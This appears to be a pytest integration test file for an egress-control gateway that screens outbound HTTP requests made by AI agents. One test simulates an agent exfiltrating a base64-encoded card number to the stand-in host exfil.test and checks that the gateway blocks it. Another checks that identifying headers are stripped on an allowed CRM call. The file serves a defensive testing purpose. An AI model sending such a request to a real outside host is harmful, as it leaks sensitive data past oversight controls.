"""META-V09 (in-process integration): the REAL app + Runtime + config/policy.yaml, upstream
replaced by a MockTransport. No ports, no models. Skips if the app cannot boot yet."""

from __future__ import annotations

import base64

import httpx
import pytest

from aegis.api.routes import egress as route

pytestmark = pytest.mark.slow


@pytest.fixture
async def stack(tmp_path, monkeypatch):
    monkeypatch.setenv("AEGIS_SEMANTIC", "off")
    try:
        from aegis.app import create_app
        from aegis.settings import Settings

        app = create_app(Settings(data_dir=tmp_path / "data", test_mode=True, semantic="off"))
    except Exception as e:  # pragma: no cover - integration not ready
        pytest.skip(f"aegis.app not bootable: {e}")
    seen: list[httpx.Request] = []

    def handler(req: httpx.Request) -> httpx.Response:
        seen.append(req)
        return httpx.Response(200, json={"contacts": [{"name": "Acme Holdings"}]})

    async with app.router.lifespan_context(app):
        fwd = route.get_forwarder(app.state.rt)
        fwd.set_transport(httpx.MockTransport(handler))
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app),
                                     base_url="http://aegis.test") as c:
            yield c, seen
        fwd.set_transport(None)


async def test_exfil_blocked_real_stack(stack) -> None:
    c, seen = stack
    pan = base64.b64encode(b"4111 1111 1111 1111").decode()
    r = await c.post("/egress", headers={"x-aegis-agent": "chaos-agent@platform"},
                     json={"method": "GET", "url": f"https://exfil.test/c?d={pan}"})
    assert r.status_code in (403, 429), r.text
    if r.status_code == 403:
        assert r.json()["error"]["control_id"] in ("DLP-04", "DLP-01", "DLP-02", "EXE-02",
                                                   "GOV-03", "SIG-01")
    assert seen == []


async def test_allowed_crm_headers_stripped_real_stack(stack) -> None:
    c, seen = stack
    r = await c.post("/egress", headers={"x-aegis-agent": "research-agent@research"},
                     json={"method": "GET", "url": "https://crm.saas.test/crm/contacts",
                           "headers": {"X-Forwarded-For": "10.1.2.3", "Cookie": "s=1",
                                       "x-stainless-os": "MacOS"}})
    if r.status_code != 200:
        pytest.skip(f"policy of the integrated stack does not allow this call: {r.text[:200]}")
    up = seen[-1]
    assert up.headers["host"] == "crm.saas.test"
    for h in ("x-forwarded-for", "cookie", "x-stainless-os"):
        assert h not in up.headers
    assert r.json()["body"]["contacts"][0]["name"] == "Acme Holdings"
